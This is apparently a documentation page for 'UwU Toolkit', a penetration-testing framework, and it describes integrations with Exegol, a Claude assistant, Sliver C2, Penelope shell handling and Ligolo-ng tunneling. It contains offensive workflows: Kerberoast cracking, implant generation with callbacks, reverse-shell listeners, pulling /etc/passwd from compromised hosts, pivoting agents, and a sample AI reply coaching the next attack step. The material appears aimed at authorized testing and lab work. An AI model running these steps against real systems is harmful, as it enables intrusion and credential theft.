---
layout: default
title: Integrations - UwU Toolkit
permalink: /uwu-toolkit/integrations/
---

# Integrations

UwU Toolkit integrates with external tools and services to enhance your penetration testing workflow.

---

## Table of Contents

- [Exegol Integration](#exegol-integration)
- [Claude AI Integration](#claude-ai-integration)
- [Sliver C2 Integration](#sliver-c2-integration)
- [Penelope Shell Handler](#penelope-shell-handler)
- [Ligolo-ng Tunneling](#ligolo-ng-tunneling)

---

## Exegol Integration

[Exegol](https://github.com/ThePorgs/Exegol) is a community-driven hacking environment with pre-installed tools. UwU Toolkit seamlessly runs commands inside Exegol containers.

### Setup

```bash
# Install Exegol
pip install exegol

# Start a container
exegol start htb full

# Set container in UwU Toolkit
uwu > setg EXEGOL_CONTAINER exegol-htb
```

### How It Works

When a module needs tools not installed locally:

1. **Tool Detection** - Module calls `find_tool("GetUserSPNs.py")`
2. **Local Check** - Searches extended PATH (`~/.local/bin`, `/opt/tools`, etc.)
3. **Exegol Fallback** - If not found, uses `run_in_exegol()` to execute in container
4. **Output Return** - Results are captured and returned to UwU Toolkit

### Module Example

```python
def run(self) -> bool:
    # Try local first
    tool_path = find_tool("impacket-GetUserSPNs")

    if tool_path:
        self.print_status("Using local tools")
        ret, stdout, stderr = self.run_command([tool_path, ...])
    else:
        self.print_status("Using Exegol")
        ret, stdout, stderr = self.run_in_exegol("GetUserSPNs.py ...")

    return ret == 0
```

### Container Auto-Detection

If `EXEGOL_CONTAINER` is not set:

1. Searches for running containers starting with `exegol-`
2. Uses the first match found
3. Prompts if multiple containers are running

### Running Commands in Exegol

```python
# Simple command
ret, stdout, stderr = self.run_in_exegol(
    "GetUserSPNs.py 'domain/user:pass' -dc-ip 10.10.10.100",
    timeout=120
)

# Specify container explicitly
ret, stdout, stderr = self.run_in_exegol(
    "NetExec smb target -u user -p pass",
    container="exegol-htb",
    timeout=60
)
```

---

## Claude AI Integration

UwU Toolkit includes an AI-powered assistant using Claude for security research, code analysis, and interactive help.

### Requirements

```bash
# Install Anthropic SDK
pip install anthropic

# Set API key in UwU Toolkit
uwu > setg ANTHROPIC_API_KEY sk-ant-api03-your-key-here
```

### Getting an API Key

1. Visit [console.anthropic.com](https://console.anthropic.com)
2. Create an account or sign in
3. Navigate to API Keys
4. Create a new API key
5. Copy the key (starts with `sk-ant-api03-`)

### Verify Setup

```bash
uwu > claude status
[+] Claude AI is available
[*] Model: claude-sonnet-4-20250514
```

### Interactive Mode

Enter a full conversation with Claude:

```bash
uwu > claude
uwu > claude mode

[Claude AI Mode]
Type 'exit' or Ctrl+D to return
Type 'help' for commands

claude > How do I enumerate Active Directory?
```

**Session Commands:**
- `exit`, `back` - Return to UwU console
- `Ctrl+D` - Background session (keep conversation)
- `new` - Start new conversation
- `clear` - Clear conversation history
- `help` - Show commands

### Resume Session

```bash
# Background with Ctrl+D, then resume later
uwu > claude resume
uwu > claude fg   # Alias
```

### Session Management

```bash
uwu > claude sessions

  Claude Sessions
  ==================================================

  * abc123  Main Session
      5 prompts, created 14:30:22
    def456  Code Review
      3 prompts, created 10:15:00
```

### Quick Commands

One-shot queries without entering interactive mode:

```bash
# Ask a question
uwu > claude ask "How do I crack Kerberos TGS hashes?"

# With file context
uwu > claude ask "Explain this code" --context ./script.py
```

### Code Analysis

Analyze code for security vulnerabilities:

```bash
# Analyze a directory
uwu > claude analyze ./webapp/

# Analyze specific file with focus
uwu > claude analyze ./api.py --focus "injection"

# Output:
[*] Analyzing ./webapp/...

  Security Analysis
  ==================================================

  HIGH: SQL Injection in login.py:45
    query = f"SELECT * FROM users WHERE name='{username}'"
    Recommendation: Use parameterized queries

  MEDIUM: Missing input validation in api.py:23
    User input passed directly to system command
```

### Code Debugging

Debug code for errors:

```bash
# Debug a file
uwu > claude debug ./module.py

# With specific error message
uwu > claude debug ./script.py --error "ImportError: No module named requests"
```

### Change Model

```bash
# View current model
uwu > claude model
[*] Current model: claude-sonnet-4-20250514

# Change model
uwu > claude model claude-opus-4-20250514
```

### Security Context

Claude understands penetration testing context and can help with:

- Explaining attack techniques
- Analyzing tool output
- Suggesting next steps in an engagement
- Code review for exploits
- Methodology guidance (HackTricks, MITRE ATT&CK)

**Example:**
```
claude > I found a Kerberoastable user with GetUserSPNs. The hash format
         is $krb5tgs$23$*... What's my next step?

Claude: Great find! Here's your attack path:

1. Save the hash to a file (e.g., kerberoast.txt)
2. Crack with hashcat:
   hashcat -m 13100 kerberoast.txt rockyou.txt

3. If weak password, you now have creds for that service account
4. Check if the account has elevated privileges...
```

---

## Sliver C2 Integration

[Sliver](https://github.com/BishopFox/sliver) is an open-source cross-platform adversary emulation/C2 framework. UwU Toolkit provides integrated management.

### Requirements

```bash
# Download Sliver
curl https://sliver.sh/install | sudo bash

# Or manually
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
chmod +x sliver-*
sudo mv sliver-server_linux /usr/local/bin/sliver-server
sudo mv sliver-client_linux /usr/local/bin/sliver-client
```

### Generate Client Config

On the Sliver server:

```bash
# Start server
sliver-server

# Generate operator config
sliver > new-operator --name p3ta --lhost 10.10.14.50
[*] Wrote operator config to: p3ta.cfg
```

Import on client:

```bash
sliver-client import ./p3ta.cfg
```

Configs are stored in `~/.sliver-client/configs/`.

### Server Management

```bash
# Start Sliver server (background)
uwu > sliver start
[*] Starting Sliver server...
[+] Sliver server started

# Stop server
uwu > sliver stop
[*] Stopping Sliver server...
[+] Sliver server stopped
```

### Connect Client

```bash
# Connect with default config
uwu > sliver connect

# Connect with specific config
uwu > sliver connect p3ta

# Full Sliver client interface
sliver > help
sliver > implants
sliver > use 1
```

### Client Interaction

While in Sliver mode:

- Full Sliver client functionality available
- All Sliver commands work (`sessions`, `implants`, `generate`, etc.)
- `Ctrl+D` - Background session (return to UwU)
- `exit` - Exit and return to UwU

### Resume Session

```bash
# After backgrounding with Ctrl+D
uwu > sliver resume
uwu > sliver fg   # Alias
```

### Status Check

```bash
uwu > sliver status

  Sliver Status
  ========================================

  Server:  Running
  Client:  Backgrounded (use 'sliver resume')
  Configs: 2 available
  Client:  /usr/local/bin/sliver-client
  Server:  /usr/local/bin/sliver-server
```

### List Configs

```bash
uwu > sliver configs

  Sliver Client Configs
  ========================================

    p3ta
      /home/p3ta/.sliver-client/configs/p3ta.cfg
    operator2
      /home/p3ta/.sliver-client/configs/operator2.cfg
```

### Typical Workflow

```bash
# 1. Start server
uwu > sliver start

# 2. Connect client
uwu > sliver connect

# 3. Generate implant
sliver > generate --mtls 10.10.14.50:443 --os windows --arch amd64 --save implant.exe

# 4. Start listener
sliver > mtls -l 443

# 5. Wait for callback, then interact
sliver > sessions
sliver > use 1

# 6. Background to UwU (keep session)
# Press Ctrl+D

uwu > # Continue with other tasks

# 7. Resume when needed
uwu > sliver resume
```

### Integration Benefits

- **Session Persistence** - Background and resume without losing state
- **Unified Interface** - Manage C2 alongside other tools
- **Variable Sharing** - Use UwU global variables in Sliver commands
- **Workflow Integration** - Switch between enumeration, exploitation, and C2

---

## Penelope Shell Handler

[Penelope](https://github.com/brightio/penelope) is an advanced shell handler with auto-upgrade capabilities. UwU Toolkit provides full interactive integration with session management.

### Requirements

```bash
# Clone Penelope
git clone https://github.com/brightio/penelope.git /opt/penelope

# Or install via pip (if available)
pip install penelope-shell

# Make executable
chmod +x /opt/penelope/penelope.py
```

### Start Listener

```bash
# Default port (4444)
uwu > penelope

# Specific port
uwu > penelope 9001

# Specific interface
uwu > penelope -i 10.10.14.50 4444
```

### Interactive Mode

When Penelope starts, you're in full interactive mode:

```
  ╔══════════════════════════════════════════════════════╗
  ║  Penelope Shell Handler                              ║
  ║  Listening on 0.0.0.0:4444                           ║
  ║  Ctrl+D - Background and return to UwU               ║
  ║  quit   - Exit Penelope and return to UwU            ║
  ╚══════════════════════════════════════════════════════╝

[+] Listening on 0.0.0.0:4444
```

### Background & Resume

```bash
# While in Penelope, press Ctrl+D to background
# Listener remains active!

[*] Penelope session backgrounded
    Listener still active on port 4444
    Use 'penelope resume' or 'penelope fg' to return
    Use 'shells' to see connected sessions

# Resume later
uwu > penelope resume
uwu > penelope fg   # Alias
```

### Session Integration

Penelope sessions automatically appear in the shell manager:

```bash
uwu > shells

  Active Shells
  ========================================

  ID   Type       Remote             User@Host            Status
  ---- ---------- ------------------ -------------------- --------
  1    penelope   10.10.10.100:49123 www-data@victim      ACTIVE
  2    penelope   10.10.10.50:51234  root@server          ACTIVE
```

### Status Check

```bash
uwu > penelope status

  Penelope Status
  ========================================

  Status:   Backgrounded (use 'penelope resume')
  Port:     4444
  Sessions: 2
  Binary:   /opt/penelope/penelope.py
```

### Penelope Features

Inside Penelope, you get:

- **Auto PTY Upgrade** - Shells automatically upgraded
- **Multi-Session** - Handle multiple shells simultaneously
- **File Transfer** - Upload/download files easily
- **Spawn** - Spawn additional listeners

```
penelope> show           # List sessions
penelope> interact 1     # Interact with session
penelope> upgrade        # Upgrade to PTY
penelope> download /etc/passwd
penelope> upload ./linpeas.sh /tmp/
penelope> spawn 9002     # New listener on 9002
```

---

## Ligolo-ng Tunneling

[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) is a simple, lightweight tunneling tool using TUN interfaces. UwU Toolkit provides full proxy management with route configuration.

### Requirements

```bash
# Download from releases
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_Linux_64bit.tar.gz

# Extract
tar -xzf ligolo-ng_proxy_Linux_64bit.tar.gz
tar -xzf ligolo-ng_agent_Linux_64bit.tar.gz

# Move to path
sudo mv proxy /usr/local/bin/ligolo-proxy
sudo mv agent /usr/local/bin/ligolo-agent
```

### Start Proxy

```bash
# Default port (11601) with auto TUN creation
uwu > ligolo

# Specific port
uwu > ligolo 11601

# Custom TUN interface
uwu > ligolo -tun mytun 11601
```

### TUN Interface Setup

UwU Toolkit automatically creates the TUN interface:

```
[*] Checking TUN interface 'ligolo'...
[!] TUN interface 'ligolo' not found, creating...
[+] TUN interface 'ligolo' created

  ╔══════════════════════════════════════════════════════╗
  ║  Ligolo-ng Proxy                                     ║
  ║  Listening on 0.0.0.0:11601                          ║
  ║  TUN Interface: ligolo                               ║
  ║  Ctrl+D - Background and return to UwU               ║
  ║  exit   - Exit Ligolo and return to UwU              ║
  ╚══════════════════════════════════════════════════════╝
```

If automatic creation fails, create manually:

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

### Background & Resume

```bash
# While in Ligolo, press Ctrl+D to background
# Proxy and tunnels remain active!

[*] Ligolo-ng session backgrounded
    Proxy still active on port 11601
    TUN interface 'ligolo' remains active
    Use 'ligolo resume' or 'ligolo fg' to return

# Resume later
uwu > ligolo resume
uwu > ligolo fg   # Alias
```

### Route Management

Add routes to access internal networks through the tunnel:

```bash
# Add route
uwu > ligolo route add 10.10.10.0/24
[+] Route added: 10.10.10.0/24 via ligolo

# Add another subnet
uwu > ligolo route add 172.16.0.0/16

# List routes
uwu > ligolo routes

  Ligolo Routes
  ========================================

    10.10.10.0/24 via ligolo
    172.16.0.0/16 via ligolo

# Remove route
uwu > ligolo route del 172.16.0.0/16
```

### Agent Management

View connected agents:

```bash
uwu > ligolo agents

  Ligolo-ng Agents
  ============================================================

  ID   Remote IP        Hostname             User         Tunnel
  ---- ---------------- -------------------- ------------ --------
  0    10.10.10.100     DC01                 CORP\admin   active
  1    10.10.10.50      WEB01                www-data     idle
```

### Status Check

```bash
uwu > ligolo status

  Ligolo-ng Status
  ========================================

  Status:    Backgrounded (use 'ligolo resume')
  Port:      11601
  TUN:       ligolo
  Agents:    2
  Binary:    /usr/local/bin/ligolo-proxy
  Routes:    10.10.10.0/24, 172.16.0.0/16
```

### Typical Workflow

```bash
# 1. Start proxy
uwu > ligolo

# 2. On target, run agent
./agent -connect YOUR_IP:11601 -ignore-cert

# 3. In Ligolo, select session
ligolo» session
? Specify a session:
> 0 - CORP\admin@DC01 - 10.10.10.100

# 4. Start tunnel
ligolo» start

# 5. Background to UwU
# Press Ctrl+D

# 6. Add routes
uwu > ligolo route add 10.10.10.0/24

# 7. Now you can access internal network directly!
uwu > !nmap -sV 10.10.10.50

# 8. Resume Ligolo when needed
uwu > ligolo resume
```

### Inside Ligolo Proxy

```
ligolo» session         # List/select sessions
ligolo» ifconfig        # Show agent interfaces
ligolo» start           # Start tunnel
ligolo» stop            # Stop tunnel
ligolo» listener_add    # Add reverse port forward
ligolo» listener_list   # List port forwards
```

---

## Shell Management

UwU Toolkit includes Sliver-like shell session management for basic reverse shells.

### Start Listener

```bash
# Netcat listener
uwu > listen 4444
uwu > listen 4444 nc

# Penelope listener (if available)
uwu > listen 4444 penelope
```

### List Sessions

```bash
uwu > shells
uwu > sessions   # Alias

  Active Shells
  ========================================

  ID   Type   Remote             Status     Upgraded
  ---- ------ ------------------ ---------- --------
  1    nc     10.10.10.100:49123 active     no
  2    nc     10.10.10.50:51234  active     yes
```

### Interact with Shell

```bash
uwu > interact 1
[*] Interacting with shell 1
[*] Press Ctrl+D to background

$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ^D
[*] Shell backgrounded
```

### Kill Session

```bash
uwu > kill 1
[+] Shell 1 killed
```

---

[Back to Wiki Index](/uwu-toolkit/)
